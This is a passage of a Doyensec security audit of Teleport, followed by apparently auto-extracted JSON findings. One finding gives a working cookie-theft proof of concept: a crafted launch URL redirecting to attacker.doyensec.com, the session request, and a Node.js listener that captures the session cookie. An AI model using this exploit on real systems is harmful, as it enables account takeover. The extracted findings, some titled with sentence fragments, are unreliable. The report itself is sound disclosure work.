Teleport's AAP authentication ﬂow, \nthis endpoint is handled by the CreateAppSession function (lib/web/apps.go:89), which attempts to \nuse the provided parameters to resolve to an application running within either the root or leaf cluster. \n\nIn order to safely redirect a user to the app URL and prevent open redirects, the \nvalidateAppSessionRequest method is called, making a best-effort attempt to resolve FQDN to a \nknown application. \n\n52\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n \n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nfunc (h *Handler) resolveFQDN(ctx context.Context, fqdn string) (*services.App, \nservices.Server, string, error) { \n // Parse the address to remove the port if it's set. \n addr, err := utils. ParseAddr(fqdn) \n if err != nil { \n\nreturn nil, nil, \"\", trace.Wrap(err) \n\n } \n\n // Try and match FQDN to public address of application within cluster. \n application, server, err := app.Match(ctx, h.cfg.ProxyClient, \napp.MatchPublicAddr(addr.Host())) \n if err == nil { \n\nreturn application, server, h.auth.clusterName, nil \n\n } \n\n // Extract the first subdomain from the FQDN and attempt to use this as the \n // application name. \n appName := strings. Split(addr.Host(), \".\")[0] \n\n... \n} \n\nDue to a logic error when performing the validation, it is possible to provide any FQDN to be accepted. The \nonly requirement is that the ﬁrst slice of the FQDN string separated by a full stop (.) should match the \ntargeted application name. This is particularly dangerous, since the AAP authentication ﬂow then \ncontinues by making a redirect to the requested app auth endpoint using the original FQDN (src/\nAppLauncher/useAppLauncher.ts) and attaching the session cookie value for the application in a \nfragment: \n\n React.useEffect(() => { \n service \n .createAppSession(params) \n .then(result => { \n // make a redirect to the requested app auth endpoint \n const location = window.location; \n const port = location.port ? ':' + location.port : ''; \n window.location.replace( \n `https://${result.fqdn}${port}/x-teleport-auth#value=${result.value}` \n ); \n }) \n .catch((err: Error) => { \n setAttempt({ \n status: 'failed', \n statusText: err.message, \n }); \n }); \n }, []); \n\nAn attacker can use the aforementioned /web/launch/:fqdn/:clusterId/:publicAddr endpoint to \nstart an attack by pointing the FQDN parameter to a controlled server. After the redirect occurs, the \nattacker will have access to the fragment value via client-side Javascript. An attacker can also leverage \nissue TEL-Q420-7 to authenticate the user after stealing the session cookie, lowering detection risks. \n\n53\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n \n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nReproduction Steps \n\nThe following steps have been dynamically reproduced on the Teleport staging instance provided to \nDoyensec (https://doyensec-2020.gravitational.io:3080/). In our proposed attack scenario: \n\n1. Alice wants to access the SampleApp AAP-protected application. An attacker (Eve) provides Alice with \n\na malicious /web/launch/ URL, setting the FQDN parameter to their attacker-controlled server: \n\nhttps://doyensec-2020.gravitational.io:3080/web/launch/\nsampleapp.doyensec.com@attacker.doyensec.com/doyensec-2020/\nsampleapp.doyensec.com \n\n2. When visited, a session will be created through a POST request ﬁred by Alice to the /v1/webapi/\n\nsessions/app endpoint: \n\nPOST /v1/webapi/sessions/app HTTP/1.1 \nHost: doyensec-2020.gravitational.io:3080 \nAccept: application/json \nX-CSRF-Token: a1b2c3d4e5f6h7i8j... \nAuthorization: Bearer a1b2c3d4e5f6h7i8j... \nContent-Length: 153 \nConnection: close \nCookie: grv_csrf=a1b2c3d4e5f6h7i8j...; session=a1b2c3d4e5f6h7i8j... \n\n{ \n \"fqdn\": \"sampleapp.doyensec-2020.gravitational.io@attacker.doyensec.com\", \n \"cluster_name\": \"doyensec-2020\", \n \"public_addr\": \"sampleapp.doyensec-2020.gravitational.io\" \n} \n\n3. The Teleport server will return a session cookie string (CookieValue) that will be attached as a URI \nfragment to the location pointed by evil FQDN (attacker.doyensec.com). Eve now only needs to \nexﬁltrate the fragment via Javascript and possibly redirect the victim using the forced login CSRF \nidentiﬁed in TEL-Q420-7. \n\n54\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\n4. Eve can then use the stolen cookie and be identiﬁed as Alice through Teleport headers: \n\nGET / HTTP/1.1 \nHost: 127.0.0.1:41521 \nCf-Access-Token: \neyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9eyJhdWQiOlsiaHR0cDovLzEyNy4wLjAuMTo0MTUyMSJdL\nCJleHAiOjE2MDcxNDQ4MjAsImlzcyI6ImRveWVuc2VjLTIwMjAiLCJuYmYiOjE2MDcxMDIwNDcsInJvbG\nVzIjpbImFkbWluIl0sInN1YiI6ImFsaWNlIiwidXNlcm5hbWUiOiJhbGljZSJ9.IS-\nM4CcuNHZnCTHHrwRlEys_Mby3VZryRdTKzClCu9CWXeNg.... \nTeleport-Jwt-Assertion: \neyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9eyJhdWQiOlsiaHR0cDovLzEyNy4wLjAuMTo0MTUyMSJdL\nCJleHAiOjE2MDcxNDQ4MjAsImlzcyI6ImRveWVuc2VjLTIwMjAiLCJuYmYiOjE2MDcxMDIwNDcsInJvbG\nVzIjpbImFkbWluIl0sInN1YiI6ImFsaWNlIiwidXNlcm5hbWUiOiJhbGljZSJ9.IS-\nM4CcuNHZnCTHHrwRlEys_Mby3VZryRdTKzClCu9CWXeNg.... \n\nWhen the JWT is decoded: \n\n{ \n \"aud\": [ \n \"http://127.0.0.1:41521\" \n ], \n \"exp\": 1607144820, \n \"iss\": \"doyensec-2020\", \n \"nbf\": 1607102047, \n \"roles\": [ \n \"admin\" \n ], \n \"sub\": \"Alice\", \n \"username\": \"Alice\" \n} \n\nThis attack can be fully reproduced by running the following Node.js listener (running on e.g. \nattacker.doyensec.com:3080) and generating the corresponding TLS certiﬁcate (device.key and \nattacker.doyensec.com.crt): \n\nconst fs = require('fs') \nconst express = require('express') \nconst https = require('https') \n\nconst app = express() \nconst port = 3080 \nconst host = 'attacker.doyensec.com'; \n\napp.get('/x-teleport-auth', (req, res) => { \n var body = `<html> \n <script> \n if(window.location.hash) { \n // Fragment exists \n document.write(\"Stolen cookie! \"+window.location.hash) \n } else { \n // Fragment doesn't exist \n document.write(\"No hash detected :(\") \n } \n </script> \n </html>` \n res.send(body) \n}) \n\nhttps.createServer({ \n\n55\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\n key: fs.readFileSync('device.key'), \n cert: fs.readFileSync('attacker.doyensec.com.crt') \n}, app).listen(port, host, () => { \n console.log(`Evil app listening at https://${host}:${port}`) \n}) \n\nImpact \n\nHigh. An unauthenticated attacker could just provide a malicious launch URL and steal a valid session \ncookie for an application. Additionally, Teleport's audit log will only register the public address of the login \nevent for the application, while the FQDN used in the attack won't be logged. \n\nComplexity \n\nLow. Since the attack requires little to no user interactions and can be opaque to a victim when chained \nwith a previously reported issue (TEL-Q420-7). \n\nRemediation \n\nRestrict the FQDN possible values in launch URLs, forcing its correct resolution to a known AAP \napplication callback registered in the clusters. \n\nA strict whitelisting approach should be employed in the lib/web/apps.go FQDN validation mechanism. \n\n56\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nTEL-Q420-18 Weak Content-Security-Policy Directives\n\nSeverity\n\nVulnerability Class\n\nComponent\n\nStatus\n\nDescription \n\nLow\n\nSecurity Misconﬁguration\n\nlib/web/app/redirect.go\n\nClosed\n\nContent Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types \nof attacks, including Cross-Site Scripting (XSS) and data injection attacks. \n\nThe current CSP policy set by the Teleport application on the AAP fragment redirect \n(setRedirectPageHeaders) in lib/web/app/redirect.go:27 is too loose and some of its directives \ncan lead to CSP bypasses: \n\nfunc setRedirectPageHeaders(h http.Header, nonce string) { \n httplib. SetIndexHTMLHeaders(h) \n // Set content policy flags \n var csp = strings. Join([]string{ \n\n// Should match the <script> tab nonce (random value). \n\nfmt. Sprintf(\"script-src 'nonce-%v'\", nonce), \n\n\"style-src 'self'\", \n\"object-src 'self'\", \n\"img-src 'self'\", \n\n }, \";\") \n... \n} \n\nA. Base URI \n\nThe base-url directive restricts the URLs which can be used in a document's <base> element. The lack \nof this directive in Teleport's current policy allows the injection of base tags. Such tags can be used to set \nthe base URL for all relative script URLs to an attacker-controlled domain. \n\nB. Object Source \n\nThe object-src directive, specifying valid sources for the <object>, <embed>, and <applet> elements, is \ncurrently missing from the CSP policy. As stated by the “CSP: object-src” speciﬁcation on MDN Web \nDocs : 15\n\n“Elements controlled by object-src are perhaps coincidentally considered legacy HTML elements and \naren't receiving new standardized features (such as the security attributes sandbox or allow for <iframe>). \nTherefore it is recommended to restrict this fetch-directive (e.g. explicitly set object-src 'none' if \npossible).” \n\n15\n\n https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/object-src\n\n57\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n \n \n \n \n \n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nReproduction Steps \n\nTargeting any AAP application, request via GET the endpoint /x-teleport-auth. The Content-\nSecurity-Policy returned in the response is: \n\nContent-Security-Policy: script-src \n'nonce-1a2b3c4d28038b02d0d1238380950ea0';style-src 'self';object-src 'self';img-\nsrc 'self' \n\nImpact \n\nHigh. This misconﬁguration can be leveraged for exploiting Cross-Site Scripting vulnerabilities. An \nattacker may perform actions on behalf of the user or execute malicious Javascript code in the context of \nthe user session. \n\nComplexity \n\nMedium. An attacker still needs a way to run arbitrary Javascript code, however, the lack of the base-uri \nand object-src directives jeopardize the defense in depth provided by the CSP policy. \n\nRemediation \n\nSince CSP is a defense-in-depth security feature, we recommend explicitly setting the object-src \ndirective to none and the base-uri to self. \n\nResources \n\n- Weichselbaum, Lukas, et al. \"CSP is dead, long live CSP! On the insecurity of whitelists and the future of \ncontent security policy.\" Proceedings of the 2016 ACM SIGSAC Conference on Computer and \nCommunications Security. 2016. \nhttps://research.google.com/pubs/archive/45542.pdf \n\n- \"Content Security Policy (CSP)\" , MDN Web Docs \n\nhttps://developer.mozilla.org/en-US/docs/Web/HTTP/CSP \n\n- “H5SC Minichallenge 3”, cure53/XSSChallengeWiki \n\nhttps://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22 \n\n58\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nAppendix A - Vulnerability Classiﬁcation \n\nVulnerability Severity\n\nCritical\n\nHigh\n\nMedium\n\nLow\n\nInformational\n\nVulnerability Class\n\nComponents With Known Vulnerabilities\n\nCovert Channel (Timing Attacks, etc.)\n\nCross Site Request Forgery (CSRF)\n\nCross Site Scripting (XSS)\n\nDenial of Service (DoS)\n\nInformation Exposure\n\nInjection Flaws (SQL, XML, Command, Path, etc)\n\nInsecure Design\n\nInsecure Direct Object References (IDOR)\n\nInsufﬁcient Authentication and Session Management\n\nInsufﬁcient Authorization\n\nInsufﬁcient Cryptography\n\nMemory Corruption (Buffer and Integer Overﬂows, Format String, etc)\n\nRace Condition\n\nSecurity Misconﬁguration\n\nServer-Side Request Forgery (SSRF)\n\nUnrestricted File Uploads\n\nUnvalidated Redirects and Forwards\n\nUser Privacy\n\nTime-of-Check to Time-of-Use (TOCTOU)\n\n59\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nAppendix B - Remediation Checklist \n\nThe table below can be used to keep track of your remediation efforts inside this report. Mark the boxes \nwhen a ﬁx has been implemented for the vulnerability. \n\nagainst deviation from the standard gzip format \n\nClose() idiom, or security-impactful bugs may occur\n\n☐ As a potential best-effort solution, consider implementing a robust gzip decoder with defenses \n☑ For security-sensible writable ﬁles, Teleport developers should avoid the defer the \n☐ Resolve only to the ﬁrst Address Record entry of a node name or reject DNS records with \n☑ Limit the possible set of error messages, only displaying valid error types. If not possible, limit \n☑ Provide opaque error causes for restricted clusters\n\nmultiple (>2) Address entries\n\nthe error message length\n\n☑\n\n- Raise an error and abort the connection in case a certiﬁcate is not passed, or \n- Create a dedicated function only meant for unit tests with a distinct name (e.g. \nUnsafeNewSpdy RoundTripperWithDialer). In this case, consider introducing pre-commit \nhooks to detect any insecure use of such function\n\nattacks\n\naudit log\n\nassociated to the user is updated or changed, or if a successful password change occurs\n\ncharacters for the name value (e.g. /^[\\w-_.]+$/) and a restricted set of characters for the URI \nvalue (e.g. /^[\\w-\\/:@?=_.]+$/)\n\n☑ Implement a CSRF token-based mitigation similar to the OAuth state token to prevent similar \n☑ Ensure that the passed variables are correctly escaped, possibly only allowing alphanumeric \n☐ Invalidate every AAP application session if the parent session is manually invalidated, if the role \n☐ Ensure that the request is ﬁred to a safe host, possibly limiting the response content in the \n☑ Limit the length and the charset of all requesters' reasons (e.g. /^[\\w @\\/()]{0,60}$/)\n☑ Don’t allow user-provided headers to override any headers set by Teleport's AAP\n☑ The metric endpoint should be available only to authenticated clients. If this is not possible, \n☑ Perform expiration checks on the certiﬁcate returned during the ﬁrst connection by the \n\nauthentication server. Lower the default TTL for a CA to 1 year, implementing automatic \nrotation through the RotateCertAuthority function (lib/auth/rotate.go:204)\n\nresource tokens should be partially redacted to limit the exﬁltration risk\n\n60\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\n☑ Avoid loading arbitrary data into memory regardless of size. Limit the size of a valid JSON tree \n\nand return an error closing the connection when it consumes a substantial amount of memory, \nespecially for unauthenticated remote endpoints\n\nthe application should keep track of failures and log alerts for sensible operations. In some \ncases additional actions could be performed in response to errors\n\n☑ Ensure that the platform is built to gracefully handle all possible errors. In the implementation, \n☑ Restrict the FQDN possible values in launch URLs, forcing its correct resolution to a known AAP \n☑ Since CSP is a defense-in-depth security feature, we recommend explicitly setting the object-\n\nsrc directive to none and the base-uri to self\n\napplication callback registered in the clusters\n\nWhen done patching the listed vulnerabilities, many clients ﬁnd it worthwhile to perform a retest. During \na retest Doyensec researchers will attempt to bypass and subvert all implemented ﬁxes. Retests usually \ntake one day. Please reach out if you’d like more information on our retesting process. \n\n61\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nAppendix C - Hardening Recommendations \n\nOptimizing the security of any application involves a compromise with usability. Teleport should ﬁnd a \nbalance between security and UX, to protect user data while keeping the application accessible to \neveryone. \n\nWith the objective of ﬁnding such balance and through discussions on the unique threat model, Doyensec \ncreated the following hardening recommendations. We recommend considering the following changes to \nimprove the overall security posture of the Teleport platform. \n\nA. The Process ID (PID) File Must Be Properly Secured \n\n- The PIDFile conﬁguration directive sets the ﬁle path to the process ID ﬁle to which the Teleport \ndaemon records the process id of the server, which is useful for sending a signal to the server process \nor for checking on the health of the process. \nIn the Teleport documentation, it is recommended for production purposes to start the Teleport daemon \nvia an init system like systemd setting the PIDFile directive. Here's the recommended Teleport service \nunit ﬁle for systemd as of v5.0.0: \n\n[Unit] \nDescription=Teleport SSH Service \nAfter=network.target \n\n[Service] \nType=simple \nRestart=on-failure \nExecStart=/usr/local/bin/teleport start --config=/etc/teleport.yaml --pid-file=/\nrun/teleport.pid \nExecReload=/bin/kill -HUP $MAINPID \nPIDFile=/run/teleport.pid \n\n[Install] \nWantedBy=multi-user.target \n\n- This PIDFile directive is used to set the path of the ﬁle that should contain the process ID number of \nthe main child that should be monitored. If the PIDFile is set writable, other accounts could create a \nDenial of Service attack and prevent the server from starting by creating a PID ﬁle with the same name. \nIn /lib/service/service.go:738 a PIDFile (teleport.pid) is created in the directory speciﬁed by \nthe --pid-file ﬂag (usually the /var/run/ or /run/ directories). This PID ﬁle is created with 0666 \npermissions. As a ﬁx, set appropriate permissions and/or ownership for the PID ﬁle. \n\n62\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nB. SAML Dependency Generating Non-Random UUIDv4 \n\n18\n\n16\n\n- The SAML 2.0 library for Service Providers russellhaering/gosaml2 integrated with Teleport is used in \nits early v0.0.0-20170515204909-8908227c114a . In this release its build_request.go ﬁle is using \n17\nthe satori/go.uuid dependency to generate UUIDv4 and populate the assertions' ID attribute. In a later \nversion of the russellhaering/gosaml2 library, the dependency was removed. \nIn March 2018, a bug in the satori/go.uuid library was discovered affecting UUIDv4 generation. \nAffected versions of this package were found to be vulnerable to insecure randomness producing \npredictable UUID \nlimited number of bytes read when using \nthe g.rand.Read function. While the issue was later ﬁxed in the master branch, the russellhaering/\ngosaml2 library version currently featured in Teleport is still using the v1.1.1 affected by this security \nbug (v1.1.1-0.20170321230731-5bf94b69c6b6). The impact of the issue is negligible since Teleport \nSAML connectors should not be directly affected in a way that impacts the security of the SAML \nauthentication scheme provided by russellhaering/gosaml2. \n\nidentiﬁers due to the \n\n19\n\nC. Arbitrary Host Header Accepted \n\n- RFC2616 deﬁnes the Host request-header ﬁeld to specify the Internet host and port number of the \nresource being requested, as obtained from the original URI given by the user or referring resource. \nBecause of its design, Teleport's AAP proxy is accepting any value for its Host HTTP header. While a \nbest-effort FQDN resolution is used to identify the requested application running a root or leaf cluster, \nTeleport should limit this ﬂexibility to the second-level (hostname) domain, while enforcing a check on \nthe domain and port components of the requested FQDN. \n\nD. Reduce DoS-prone Coding Patterns \n\n- The ﬂexibility provided by the Go HTTP library can be extremely risky without adequate protection \nagainst large content and can lead to Denial of Service (DoS) issues. While the MaxBytesReader and \nMaxHeaderLines settings can help mitigate some attacks, further processing of large headers can still \nlead to general slow-downs when computationally-intensive operations are performed. As a way of \nexample, in order to decide which forwarder (HTTP or WebSocket) to use based on the speciﬁc request, \nTeleport's Oxy HTTP server calls the isWebsocketRequest in the ServeHTTP function (gravitational/\noxy/forward/fwd.go:166): \n\n// ServeHTTP decides which forwarder to use based on the specified \n// request and delegates to the proper implementation \nfunc (f *Forwarder) ServeHTTP(w http.ResponseWriter, req *http.Request) { \n if isWebsocketRequest(req) { \n\nf.websocketForwarder. serveHTTP(w, req, f.handlerContext) \n\n } else { \n\nf.httpForwarder. serveHTTP(w, req, f.handlerContext) \n\n } \n} \n\n16\n\n https://github.com/russellhaering/gosaml2 \n\n17\n\n https://github.com/russellhaering/gosaml2/tree/8908227c114abe0b63b1f0606abae72d11bf632a/ \n\n18\n\n https://github.com/satori/go.uuid \n\n19\n\n https://github.com/satori/go.uuid/issues/73 \n\n63\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n \n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nTo make this decision, the isWebsocketRequest function checks if the request contains both the \nConnection header set to \"upgrade\" and the Upgrade header set to \"websocket\": \n\n// isWebsocketRequest determines if the specified HTTP request is a \n// websocket handshake request \nfunc isWebsocketRequest(req *http.Request) bool { \n containsHeader := func(name, value string) bool { \n\nitems := strings. Split(req.Header.Get(name), \",\") \nfor _, item := range items { \n\nif value == strings. ToLower(strings.TrimSpace(item)) { \n\nreturn true \n\n} \n\n} \nreturn false \n\n } \n return containsHeader(Connection, \"upgrade\") && containsHeader(Upgrade, \n\"websocket\") \n} \n\nSince the containsHeader function is performing a strings' Split() on the whole header's content, it is \npossible for an attacker to provide a Connection and an Upgrade header containing a large number of \ncomma separators, triggering a computationally intensive request. Potential mitigations include \nevaluating the complexity of strings passed to the such functions or truncating a header string if it is \nover a reasonable length. Alternatively, the Teleport team should decreasing the maximum permitted \nsize of a header by overriding the Server.MaxHeaderBytes setting . 20\n\n- The same pattern can be also identiﬁed in other parts of the codebase such as in lib/utils/\nlinking.go:84, where a split is performed in the ParseWebLinks function on a third-party provided \nheader (in this case, Github's API): \n\n// ParseWebLinks partially implements RFC 8288 parsing, enough to support \n// GitHub pagination links. See https://tools.ietf.org/html/rfc8288 for more \n// details on Web Linking and https://github.com/google/go-github for the API \n// client that this function was original extracted from. \n// \n// Link headers typically look like: \n// \n// Link: <https://api.github.com/user/teams?page=2>; rel=\"next\", \n// <https://api.github.com/user/teams?page=34>; rel=\"last\" \nfunc ParseWebLinks(response *http.Response) WebLinks { \n wls := WebLinks{} \n\n if links, ok := response.Header[ \"Link\"]; ok && len(links) > 0 { \n\nfor _, lnk := range links { \n\nfor _, link := range strings.Split(lnk, \",\") { \n\nsegments := strings.Split(strings.TrimSpace(link), \";\") \n\n// link must at least have href and rel \n... \n\n// ensure href is properly formatted \n... \n\n// try to pull out page parameter \n... \n\n https://github.com/golang/go/blob/50b16f9de590822a04ec8d6cbac476366c1bde32/src/net/http/\n\n20\nserver.go#L2598-L2603 \n\n64\n\n of \n\n65\n\n WWW.DOYENSEC.COM\n\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n\fGravitational, Inc. (DBA Teleport) - Security Auditing Report\n\nfor _, segment := range segments[ 1:] { \n\n... \n\n} \n\n} \n\n} \n\n } \n\n return wls \n} \n\nE. Require User Interaction for Launch Links \n\n- When launching a new application or terminal session, ensure that further conﬁrmation is required from \nthe users when initiating them from direct URLs in respect to when launched from the Teleport Web UI \nby checking the Origin/Referer header. Requiring an explicit conﬁrmation for the action would limit \nthe exploitability of potential issues similar to TEL-Q420-3 and TEL-Q420-7.\n\n65\n\n of \n\n65\n\n WWW.DOYENSEC.COM",
+    "sourceFileName": "Doyensec_Gravitational_Teleport_Testing_Q42020.pdf",
+    "createdAtIso": "2026-06-05T23:28:44.476Z",
+    "updatedAtIso": "2026-06-05T23:28:44.476Z"
+  },
+  "findings": [
+    {
+      "id": "F-doyensec-001",
+      "slug": "decompression-bomb-in-decompress-functions-investigation-scope",
+      "reportId": "G-doyensec-teleport-q42020",
+      "reportName": "doyensec-teleport-q42020",
+      "title": "Decompression Bomb In Decompress Functions",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "investigation-scope",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:28:36.470Z",
+      "summary": "Decompression Bomb In Decompress Functions affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: TEL-Q420-1 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:28:44.408Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "Decompression Bomb In Decompress Functions",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "Decompression Bomb In Decompress Functions affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: TEL-Q420-1 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "decompression bomb in decompress functions",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "TEL-Q420-1|decompression bomb in decompress functions|investigation-scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Decompression Bomb In Decompress Functions",
+        "sourceText": "TEL-Q420-1 Decompression Bomb In Decompress Functions",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "inferred",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        }
+      }
+    },
+    {
+      "id": "F-doyensec-002",
+      "slug": "session-files-are-uploaded-to-the-auth-server-s-container-and-later-copied-as-tar-file-into-an-s3-bu",
+      "reportId": "G-doyensec-teleport-q42020",
+      "reportName": "doyensec-teleport-q42020",
+      "title": "Session files are uploaded to the Auth server's container and later copied as tar file into an S3 bucket",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "investigation-scope",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:28:36.470Z",
+      "summary": "Session files are uploaded to the Auth server's container and later copied as tar file into an S3 bucket affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:28:44.408Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "Session files are uploaded to the Auth server's container and later copied as tar file into an S3 bucket",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "Session files are uploaded to the Auth server's container and later copied as tar file into an S3 bucket affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "session files are uploaded to the auth server's container and later copied as tar file into an s3 bucket",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "|session files are uploaded to the auth server s container and later copied as tar file into an s3 bucket|investigation-scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 62,
+        "sourceSectionTitle": "Session files are uploaded to the Auth server's container and later copied as tar file into an S3 bucket",
+        "sourceText": "6. Session files are uploaded to the Auth server's container and later copied as tar file into an S3 bucket.",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "inferred",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        }
+      }
+    },
+    {
+      "id": "F-doyensec-003",
+      "slug": "to-verify-the-attack-check-the-size-of-the-playback-session-in-the-auth-container-the-file-will-be-i",
+      "reportId": "G-doyensec-teleport-q42020",
+      "reportName": "doyensec-teleport-q42020",
+      "title": "To verify the attack, check the size of the playback session in the Auth container. The file will be",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "investigation-scope",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:28:36.470Z",
+      "summary": "To verify the attack, check the size of the playback session in the Auth container. The file will be affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:28:44.408Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "To verify the attack, check the size of the playback session in the Auth container. The file will be",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "To verify the attack, check the size of the playback session in the Auth container. The file will be affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "to verify the attack, check the size of the playback session in the auth container. the file will be",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "|to verify the attack check the size of the playback session in the auth container the file will be|investigation-scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 62,
+        "sourceSectionTitle": "To verify the attack, check the size of the playback session in the Auth container. The file will be",
+        "sourceText": "8. To verify the attack, check the size of the playback session in the Auth container. The file will be",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "inferred",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        }
+      }
+    },
+    {
+      "id": "F-doyensec-004",
+      "slug": "cluster-ip-leakage-through-round-robin-dns-abusing-investigation-scope",
+      "reportId": "G-doyensec-teleport-q42020",
+      "reportName": "doyensec-teleport-q42020",
+      "title": "Cluster IP Leakage Through Round-Robin DNS Abusing",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "investigation-scope",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:28:36.470Z",
+      "summary": "Cluster IP Leakage Through Round-Robin DNS Abusing affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: TEL-Q420-3 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
